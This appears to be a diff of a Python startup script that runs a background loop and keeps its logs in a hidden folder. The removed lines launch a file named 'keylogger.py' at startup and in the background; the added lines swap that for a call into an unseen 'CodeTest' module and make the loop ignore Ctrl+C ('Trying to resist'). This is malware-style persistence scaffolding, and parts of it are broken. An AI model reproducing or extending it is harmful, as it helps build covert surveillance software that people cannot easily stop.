@@ -3,13 +3,14 @@ import os
 import sys
 import threading
 import time
+import CodeTest
 
 LOG_DIR = os.path.join(os.path.expanduser("~"), ".local", "share", "MyStartupAppLogs")
 LOG_FILE = os.path.join(LOG_DIR, "startup_log.txt")
 
 os.makedirs(LOG_DIR, exist_ok=True)
 
-def run_in_background(target: str, *args, **kwargs):
+def run_in_background(target, *args, **kwargs):
     """Start a callable in a background daemon thread."""
     thread = threading.Thread(target=target, args=args, kwargs=kwargs, daemon=True)
     thread.start()
@@ -33,19 +34,25 @@ def run_on_startup(startup_task=None, *args, **kwargs):
     log_message(f"Current working directory: {os.getcwd()}")
 
     iteration = 0
+
+    # while not True:
+    #     print("Operation failed. Try again.")
+    #     pass
+
+
     while True:
         try:
             iteration += 1
             log_message(f"Running iteration {iteration} of background task.")
-            time.sleep(10)
+            time.sleep(2)
         except KeyboardInterrupt:
-            log_message("Program interrupted by Ctrl+C. Exiting.")
-            break
+            log_message("Program interrupted by. Trying to resist")
+            pass
         except Exception as e:
             log_message(f"An error occurred: {e}. Attempting to continue.")
-            time.sleep(5)
+            time.sleep(1)
 
 
 if __name__ == "__main__":
-    run_on_startup("keylogger.py")
-    run_in_background("keylogger.py")
+    run_on_startup(CodeTest.codeTest())
+    run_in_background(CodeTest.codeTest())
